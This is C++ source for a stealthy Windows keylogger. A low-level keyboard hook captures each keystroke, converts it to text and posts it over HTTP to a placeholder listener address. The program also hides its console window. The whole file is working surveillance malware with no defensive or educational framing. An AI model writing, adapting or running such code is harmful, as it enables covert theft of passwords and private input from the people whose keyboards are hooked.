#include <windows.h>
#include <curl/curl.h>
#include <string>
#include <map>

// Function to send data to the server
void sendToServer(const std::string &data) {
    CURL *curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://<LISTENER_IP>:5000/endpoint"); // Replace with your server URL
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
}

// Convert virtual-key codes to readable characters
std::string keyToString(DWORD vkCode, bool shiftPressed) {
    std::map<DWORD, std::string> keyMap = {
        {VK_SPACE, " "}, {VK_RETURN, "\n"}, {VK_TAB, "\t"},
        {VK_SHIFT, "[SHIFT]"}, {VK_BACK, "[BACKSPACE]"},
        {VK_CONTROL, "[CTRL]"}, {VK_MENU, "[ALT]"},
        {VK_OEM_1, ";"}, {VK_OEM_PLUS, "="}, {VK_OEM_COMMA, ","},
        {VK_OEM_MINUS, "-"}, {VK_OEM_PERIOD, "."}, {VK_OEM_2, "/"},
        {VK_OEM_3, "`"}, {VK_OEM_4, "["}, {VK_OEM_5, "\\"},
        {VK_OEM_6, "]"}, {VK_OEM_7, "'"}
    };

    if (keyMap.find(vkCode) != keyMap.end()) {
        return keyMap[vkCode];
    } else if (vkCode >= 0x30 && vkCode <= 0x39) { // Numbers
        return std::string(1, (char)vkCode);
    } else if (vkCode >= 0x41 && vkCode <= 0x5A) { // Letters
        char letter = (shiftPressed ? (char)vkCode : (char)(vkCode + 32));
        return std::string(1, letter);
    }
    return "";
}

// Keyboard hook callback function
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static bool shiftPressed = false;

    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = pKeyBoard->vkCode;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
                shiftPressed = true;
            } else {
                std::string key = keyToString(vkCode, shiftPressed);
                if (!key.empty()) {
                    sendToServer(key);
                }
            }
        } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
                shiftPressed = false;
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to install the keyboard hook
void InstallHook() {
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(keyboardHook);
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
    InstallHook();
    return 0;
}
